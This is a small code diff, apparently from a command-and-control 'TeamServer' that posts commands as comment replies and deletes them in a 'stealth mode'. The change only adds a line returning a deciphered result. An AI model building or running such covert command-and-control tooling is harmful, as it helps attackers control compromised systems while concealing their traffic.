@@ -130,6 +130,8 @@ class TeamServer:
         if self.stealth_mode == "1":
             comment.delete()
 
+        return str(decipher)
+
     def sendCommand(self, command):
         command = self.submission.reply("in: " + command)
         self.comment_id = command.id
